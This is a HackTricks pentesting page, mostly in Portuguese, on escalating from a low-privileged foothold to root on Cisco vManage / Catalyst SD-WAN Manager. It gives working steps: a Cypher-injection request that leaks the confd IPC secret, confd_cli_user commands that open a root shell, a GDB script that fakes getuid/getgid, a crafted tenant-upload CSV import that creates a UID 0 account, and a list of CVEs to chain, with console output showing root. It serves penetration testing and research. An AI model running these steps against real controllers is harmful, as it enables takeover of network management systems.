# Cisco - vmanage

{{#include ../../banners/hacktricks-training.md}}

Depois de obter code execution no Cisco vManage / *Catalyst SD-WAN Manager* como `vmanage`, `netadmin` ou `vmanage-admin`, as superfícies locais de privesc mais interessantes geralmente são a stack de CLI do `confd`, o helper `cmdptywrapper`, as REST APIs do localhost e os handlers de import/upload executados como root.

Se você ainda precisar do **initial foothold** em um controller, verifique primeiro a página dedicada ao control plane:

{{#ref}}
../../network-services-pentesting/12346-udp-pentesting-cisco-sd-wan-control-plane.md
{{#endref}}

## Triagem local rápida
```bash
ps auxww | egrep 'confd|cmdptywrapper|neo4j|vdaemon'
ss -lntp | egrep '4565|830|8443'
find /run /var/run -maxdepth 2 -type s 2>/dev/null | egrep 'confd|cli|rest|mgmt'
ls -l /etc/confd/confd_ipc_secret /usr/bin/confd_cli /usr/bin/confd_cli_user
ls -la /home/vmanage-admin/.ssh 2>/dev/null
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
Se `/etc/confd/confd_ipc_secret` puder ser lido a partir do seu foothold, o Path 1 e o Path 2 se tornam imediatamente viáveis. Se você chegou por meio de um remote info leak ou de um webshell, verifique também se já consegue acessar o material SSH de `vmanage-admin` ou os handlers de upload de multitenancy: pesquisas de 2026 mostraram que ambos eram stepping stones realistas.

## Path 1

(Exemplo de [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))

Após investigar um pouco a [documentação](http://66.218.245.39/doc/html/rn03re18.html) relacionada ao `confd` e aos diferentes binários (acessível com uma conta no site da Cisco), descobrimos que, para autenticar o socket IPC, ele usa um secret localizado em `/etc/confd/confd_ipc_secret`:
```
vmanage:~$ ls -al /etc/confd/confd_ipc_secret

-rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
```
Lembra-se da nossa instância do Neo4j? Ela está sendo executada com os privilégios do usuário `vmanage`, permitindo-nos recuperar o arquivo usando a vulnerabilidade anterior:
```
GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1

Host: vmanage-XXXXXX.viptela.net



[...]

"data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
```
O programa `confd_cli` não aceita argumentos de linha de comando, mas chama `/usr/bin/confd_cli_user` com argumentos. Portanto, podemos chamar diretamente `/usr/bin/confd_cli_user` com nosso próprio conjunto de argumentos. No entanto, ele não pode ser lido com nossos privilégios atuais, então precisamos recuperá-lo do rootfs e copiá-lo usando scp, ler a ajuda e usá-lo para obter o shell:
```
vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret

vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret

vManage:~$ /tmp/confd_cli_user -U 0 -G 0

Welcome to Viptela CLI

admin connected from 127.0.0.1 using console on vManage

vManage# vshell

vManage:~# id

uid=0(root) gid=0(root) groups=0(root)
```
## Caminho 2

(Exemplo de [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))

O blog¹ da equipe synacktiv descreveu uma maneira elegante de obter um root shell, mas o problema é que isso exige obter uma cópia de `/usr/bin/confd_cli_user`, que só pode ser lida pelo root. Encontrei outra maneira de escalar para root sem esse trabalho.

Ao desmontar o binário `/usr/bin/confd_cli`, observei o seguinte:

<details>
<summary>Objdump mostrando a coleta de UID/GID</summary>
```asm
vmanage:~$ objdump -d /usr/bin/confd_cli
… snipped …
40165c: 48 89 c3              mov    %rax,%rbx
40165f: bf 1c 31 40 00        mov    $0x40311c,%edi
401664: e8 17 f8 ff ff        callq  400e80 <getenv@plt>
401669: 49 89 c4              mov    %rax,%r12
40166c: 48 85 db              test   %rbx,%rbx
40166f: b8 dc 30 40 00        mov    $0x4030dc,%eax
401674: 48 0f 44 d8           cmove  %rax,%rbx
401678: 4d 85 e4              test   %r12,%r12
40167b: b8 e6 30 40 00        mov    $0x4030e6,%eax
401680: 4c 0f 44 e0           cmove  %rax,%r12
401684: e8 b7 f8 ff ff        callq  400f40 <getuid@plt>  <-- HERE
401689: 89 85 50 e8 ff ff     mov    %eax,-0x17b0(%rbp)
40168f: e8 6c f9 ff ff        callq  401000 <getgid@plt>  <-- HERE
401694: 89 85 44 e8 ff ff     mov    %eax,-0x17bc(%rbp)
40169a: 8b bd 68 e8 ff ff     mov    -0x1798(%rbp),%edi
4016a0: e8 7b f9 ff ff        callq  401020 <ttyname@plt>
4016a5: c6 85 cf f7 ff ff 00  movb   $0x0,-0x831(%rbp)
4016ac: 48 85 c0              test   %rax,%rax
4016af: 0f 84 ad 03 00 00     je     401a62 <socket@plt+0x952>
4016b5: ba ff 03 00 00        mov    $0x3ff,%edx
4016ba: 48 89 c6              mov    %rax,%rsi
4016bd: 48 8d bd d0 f3 ff ff  lea    -0xc30(%rbp),%rdi
4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
… snipped …
```
</details>

Ao executar “ps aux”, observei o seguinte (_observação: -g 100 -u 107_)
```
vmanage:~$ ps aux
… snipped …
root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
… snipped …
```
Eu formulei a hipótese de que o programa “confd_cli” passa o ID de usuário e o ID de grupo coletados do usuário conectado para o aplicativo “cmdptywrapper”.

Minha primeira tentativa foi executar o “cmdptywrapper” diretamente e fornecer `-g 0 -u 0`, mas falhou. Parece que um descritor de arquivo (-i 1015) foi criado em algum momento do processo, e não consigo falsificá-lo.

Como mencionado no blog da synacktiv (último exemplo), o programa `confd_cli` não oferece suporte a argumentos de linha de comando, mas posso influenciá-lo com um debugger e, felizmente, o GDB está incluído no sistema.

Criei um script do GDB no qual forcei as APIs `getuid` e `getgid` a retornarem 0. Como já tenho o privilégio “vmanage” por meio do deserialization RCE, tenho permissão para ler `/etc/confd/confd_ipc_secret` diretamente.

root.gdb:
```
set environment USER=root
define root
finish
set $rax=0
continue
end
break getuid
commands
root
end
break getgid
commands
root
end
run
```
Saída do Console:

<details>
<summary>Saída do console</summary>
```text
vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
GNU gdb (GDB) 8.0.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-poky-linux".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/bin/confd_cli...(no debugging symbols found)...done.
Breakpoint 1 at 0x400f40
Breakpoint 2 at 0x401000Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401689 in ?? ()Breakpoint 2, getgid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401694 in ?? ()Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401871 in ?? ()
Welcome to Viptela CLI
root connected from 127.0.0.1 using console on vmanage
vmanage# vshell
bash-4.4# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
bash-4.4#
```
</details>

## Path 3 (2025 CLI input validation bug - CVE-2025-20122)

Cisco later documented a cleaner local root path in its own advisory for [CVE-2025-20122](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt): an **authenticated attacker with only read-only privileges** could send a crafted request to the manager CLI and jump to root because of insufficient input validation.

From an offensive perspective, this is the important takeaway:

1. Once you have *any* low-priv foothold on the box, you should test the local CLI service before going for the heavier Path 1 / Path 2 workflow.
2. Reuse the artifacts from Path 2 to find the trust boundary: `confd_cli` → `cmdptywrapper` → `vshell`.
3. Treat every field forwarded to the CLI backend as suspicious: UID/GID, username, terminal metadata, imported files, or any value later consumed by a root-owned helper.
4. If a low-priv user can reach the local CLI socket and influence those fields, root may be only one crafted request away.

A practical workflow after landing on the appliance is:
```bash
strings /usr/bin/confd_cli | egrep 'cmdptywrapper|vshell|confd'
strace -f -s 200 -o /tmp/confd.trace /usr/bin/confd_cli
ss -lntp | grep 4565
```
Isso transforma o bug de 2025 em um bom padrão de hunting para versões semelhantes: procure **shims de CLI locais que coletam a identidade no userland e a encaminham para um wrapper mais privilegiado**.

Não confunda **CVE-2025-20122** com a posterior **CVE-2026-20122**: o problema de 2025 é um bug *local* de CLI para root, enquanto o problema de 2026 é um overwrite arbitrário de arquivos via API *remota*, principalmente útil para estabelecer um foothold e depois revisitar o Path 1 / Path 2 / Path 4.

## Path 4 (API REST de baixo privilégio para root em 2026 - CVE-2026-20126)

O advisory da Cisco de fevereiro de 2026 também introduziu outra classe útil de privesc: [CVE-2026-20126](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v) permitia que um **atacante local autenticado com baixos privilégios** obtivesse root devido a um mecanismo insuficiente de autenticação de usuários na API REST.

Isso é importante porque o privesc no vManage não se limita mais ao abuso de `confd`/TTY. Depois de obter um shell com baixos privilégios, procure também por:

- endpoints de API acessíveis apenas pelo localhost que confiam demais no chamador
- tokens, cookies ou credenciais de serviço legíveis pela conta atual
- ações exclusivas de root expostas por handlers `dataservice`/REST que ainda possam ser acionadas localmente

Na prática, depois de obter um shell como `vmanage` ou outro usuário de serviço, o abuso da API local costuma ser mais silencioso e fácil de automatizar do que o abuso interativo da CLI:
```bash
env | grep -iE 'token|cookie|session'
grep -R "dataservice" /etc /opt 2>/dev/null | head
ss -lntp | grep -E '(:443|:8443)'
```
Se o contexto da sessão local for suficiente para acessar funcionalidades REST privilegiadas, prefira o caminho da API: é mais fácil reproduzir, automatizar e encadear com web sessions ou API tokens roubados.

## Caminho 5 (arquivo criado especificamente em 2026 processado por root - CVE-2026-20245)

Outro padrão recente é o [CVE-2026-20245](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx): um atacante local com privilégios de `netadmin` poderia enviar um **arquivo criado especificamente** que posteriormente era processado de forma insegura pela CLI, levando à injeção de comandos como `root`.

Do ponto de vista do HackTricks, a técnica valiosa é mais ampla que o CVE específico:

1. Enumere todos os workflows da CLI ou da web que aceitam um arquivo: imports, diagnostic bundles, templates, validators, backups, tenant data etc.
2. Rastreie onde o arquivo enviado é armazenado e qual script ou binário pertencente a root o consome.
3. Teste se o nome do arquivo, o conteúdo do arquivo ou os metadados analisados são passados para comandos shell, wrapper scripts ou helpers no estilo `system()`.
4. Se você já consegue acessar `netadmin` (credenciais válidas, sessão roubada ou uma cadeia de auth-bypass), bugs no processamento de arquivos costumam ser o caminho mais rápido para obter root.

Posteriormente, o Google Cloud / Mandiant mostrou uma ocorrência muito concreta dessa classe de bug sendo explorada por meio do caminho de importação de multitenancy:
```bash
request tenant-upload tenant-list /home/admin/evil_tenant.csv vpn 0
```
No ataque observado, o CSV criado acabou modificando `/etc/passwd` e `/etc/shadow` para criar uma conta temporária com UID 0 (`troot`). Isso torna os importadores no estilo `tenant-upload` / `tenant-list` especialmente interessantes: eles não são apenas recursos de ingestão de dados, mas possíveis front-ends de parsers executados com privilégios de root.

Um padrão rápido de busca pelo shell é:
```bash
strings /usr/bin/* 2>/dev/null | grep -E 'tenant-upload|tenant-list|import|upload|backup' | head
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
Esta classe de bug combina especialmente bem com footholds remotos que concedem `netadmin`, mas não `root`.

## Outras vulns recentes do vManage/Catalyst SD-WAN Manager para encadear

- **Unauthenticated info leak (CVE-2026-20133)** – Especialmente valioso porque pesquisas públicas mostraram que poderia expor `confd_ipc_secret` ou a chave privada de `vmanage-admin`, transformando um bug de leitura em Path 1 ou em um pivot NETCONF.
- **Authenticated API arbitrary file overwrite (CVE-2026-20122)** – Diferente do bug de CLI de 2025 mencionado acima; a VulnCheck usou-o para fazer upload de um webshell, o que torna os caminhos de local privesc desta página imediatamente relevantes.
- **Authenticated UI XSS (CVE-2024-20475)** – Roube uma sessão de admin na web UI e, em seguida, faça pivot para ações de API/CLI que eventualmente alcancem `vshell` ou um dos caminhos de local privesc acima.
- **Remote auth bypass to `netadmin` (CVE-2026-20129)** – Precursor muito forte para o Path 5, porque `netadmin` é exatamente o nível exigido pelo privesc de 2026 baseado em arquivo crafted.
- **Authenticated arbitrary file write (CVE-2026-20262)** – Valor ofensivo semelhante ao do CVE-2026-20122, mas por meio de um caminho posterior de upload na web UI: escreva em um local que será posteriormente analisado pelo `root` ou pelo web tier do management plane.
- **Downgrade to resurrect old CLI privesc (CVE-2022-20775)** – Intrusions de 2026 mostraram que attackers podem fazer rollback para uma versão antiga e vulnerável do SD-WAN, explorar o antigo bug de CLI root e, em seguida, restaurar a versão original.
- **Pre-auth control-plane auth bypass (CVE-2026-20182)** – Mais bem documentado na página dedicada ao control-plane do SD-WAN; ele pode adicionar uma chave SSH para `vmanage-admin`, fornecendo o foothold local necessário para revisitar esta página.



## Referências

- [Cisco Catalyst SD-WAN Vulnerabilities (CVE-2026-20126, CVE-2026-20129, etc.)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v)
- [Cisco Catalyst SD-WAN Controller, Catalyst SD-WAN Manager, and Catalyst SD-WAN Validator Authenticated Privilege Escalation Vulnerability (CVE-2026-20245)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx)
- [VulnCheck: Herding Cats - Recent Cisco SD-WAN Manager Vulnerabilities](https://www.vulncheck.com/blog/cisco-sd-wan-manager-vulns)
- [Google Cloud / Mandiant: Zero-Day Exploitation of Vulnerability (CVE-2026-20245) in Cisco Catalyst SD-WAN Manager](https://cloud.google.com/blog/topics/threat-intelligence/zero-day-exploitation-cisco-catalyst-sd-wan-manager)
{{#include ../../banners/hacktricks-training.md}}
